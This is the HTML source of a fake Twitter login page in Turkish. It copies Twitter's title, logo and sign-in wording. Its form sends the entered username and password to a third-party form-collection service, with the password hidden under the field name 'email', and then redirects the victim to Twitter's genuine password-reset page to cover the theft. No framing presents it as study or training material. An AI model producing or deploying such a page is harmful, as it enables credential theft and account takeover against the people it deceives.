<!DOCTYPE html>
<html>
<head>
	<title>Twitter'a giriş yap / Twitter</title>
	<link rel="stylesheet" type="text/css" href="signin.css">
	<link rel="icon" href="logorj.png">
</head>
<body>
	<div class="containar" >
		<img src="logorj.png" class="logo">
		<h1 class="tittle">Twitter'a giriş yap</h1>
		<br><br>
		<form action="https://submit-form.com/fwkNWUL7" target="_self">
		<input type="hidden" name="_redirect" value="https://twitter.com/account/begin_password_reset" />
		<div class="finput">
			<input type="text" name="subject" required placeholder="Telefon,e-posta veya kullanıcı adı">
			
		</div>
		
		<br>
		<div class="finput">
		<input type="password"  name="email" class="text-password" placeholder="Şifre">	
		</div>
		<button type="submit" class="text-btn">Giriş yap</button
		</form>
		
		
		
		<p class="last"><a href="https://twitter.com/account/begin_password_reset"> Şifreni mi unuttun? </a> <a href = "https://twitter.com/i/flow/signup"> Twitter'a kaydol</a></p>
		
	</div>

</body>
</html>
